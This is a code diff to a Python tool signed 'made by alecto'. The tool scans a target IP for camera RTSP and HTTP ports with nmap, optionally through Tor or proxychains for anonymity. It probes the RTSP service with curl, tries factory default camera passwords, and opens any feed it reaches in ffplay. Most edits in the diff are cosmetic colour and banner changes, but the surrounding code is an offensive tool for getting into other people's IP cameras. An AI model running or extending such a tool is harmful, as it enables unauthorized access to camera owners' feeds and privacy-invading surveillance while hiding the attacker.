@@ -8,7 +8,15 @@ import subprocess
 import requests
 from requests.auth import HTTPBasicAuth, HTTPDigestAuth
 
-BANNER = """
+
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+CYAN = "\033[96m"
+RESET = "\033[0m"
+
+# İstediğin özel ASCII Art ve İmza
+BANNER = f"""{RED}
 ..............................................
 ..................................................
 ..................................................
@@ -30,12 +38,14 @@ BANNER = """
 ....................fGGGGGGGGG....................
 ...............,,,,,,,,,,,,,,,,,,,.,..............
 ..................................................
-  /\  /\___| | | ___   /__   \ |__   ___ _ __ ___ 
- / /_/ / _ \ | |/ _ \    / /\/ '_ \ / _ \ '__/ _ \
+  /\\  /\\___| | | ___   /__   \\ |__   ___ _ __ ___ 
+ / /_/ / _ \\ | |/ _ \\    / /\\/ '_ \\ / _ \\ '__/ _ \\
 / __  /  __/ | | (_) |  / /  | | | |  __/ | |  __/
-\/ /_/ \___|_|_|\___/   \/   |_| |_|\___|_|  \___|
+\\/ /_/ \\___|_|_|\\___/   \\/   |_| |_|\\___|_|  \\___|
+{YELLOW} 
+                     [ made by alecto ]{RESET}
 
-             [ made by alecto]
+
 """
 
 CAMERA_PROFILES = {
@@ -61,20 +71,17 @@ CAMERA_PROFILES = {
     }
 }
 def ask_anonimity():
-    print("Do you want to use Tor/Proxy for anonymity")
-    choice = input("Y for Yes N For No Y/N?:").strip().lower()
-    if choice == ['y']:
-        print("Anonimity selected the proxychains should be configurated")
+    choice = input(f"{CYAN}Do you want to use Tor/Proxy for anonymity? (Y/N): {RESET}").strip().lower()
+    if choice == 'y':
+        print(f"{GREEN}[+] Continuing with anonymity...{RESET}")
         return True
-    print("Countinue with out anonimity")
-    return False
-
+    else:
+        print(f"{YELLOW}[-] Continuing without anonymity...{RESET}")
+        return False
 
 
 def get_ip():
-    
-    target_ip = input("Enter the Target İp Adresse").strip()
-
+    target_ip = input(f"{CYAN}Enter the Target IP Adress{RESET}").strip()
     parts = target_ip.split('.')
     if len(parts) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
         print("Invalid IP address format.")
@@ -82,8 +89,8 @@ def get_ip():
     return target_ip
 
 def scan_ports(target_ip, use_anon=False):
-    print(f"\n[*] IP Address is scanning: {target_ip} ...")
-    ports = "80,554,8080,8554"
+    print(f"\n{GREEN}[*] IP Address is scanning: {target_ip} ...{RESET}")
+    ports = "80,554,8080,8554,8000"
 
     cmd = ["nmap", "-sT", "-Pn", "-n", "-p", ports , target_ip]
     if use_anon:
@@ -106,7 +113,7 @@ def scan_ports(target_ip, use_anon=False):
     return open_ports
 
 def analyze_rtsp(target_ip):
-    print("RTSP service is analyzing")
+    print(f"{GREEN}[+] Analyzing RTSP service on {target_ip}...{RESET}")
     cmd = ["curl", "-s", "-I", "-X", "DESCRIBE", f"rtsp://{target_ip}:554/live"]
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
@@ -137,8 +144,7 @@ def analyze_http(target_ip, use_anon):
         return None
 
 def test_credentials_and_stream(target_ip):
-    """Markalara özel fabrika çıkış şifrelerini test eder ve başarılı akışı ffplay ile açar."""
-    print("[*] Testing factory passwords...")
+    print(f"{GREEN}[+] Testing streams and credentials...{RESET}")
     
     for brand, profile in CAMERA_PROFILES.items():
         for path in profile["paths"]:
@@ -168,7 +174,6 @@ def run_ffplay(rtsp_url):
 
 
 
-
 if __name__ == "__main__":
     print(BANNER)
 
@@ -179,11 +184,11 @@ if __name__ == "__main__":
         open_ports = scan_ports(target_ip, use_anon)
 
         if 554 in open_ports or 8554 in open_ports:
+            print(f"{GREEN}[+] Target RTSP Port is OPEN!{RESET}")
             analyze_rtsp(target_ip)
             test_credentials_and_stream(target_ip)
         else:
-            print("No RTSP ports found open. Try Diffrent IP Address.")
-        
+            print(f"{RED}[!] No RTSP ports found open. Try Different IP Address.{RESET}")
 
             
 
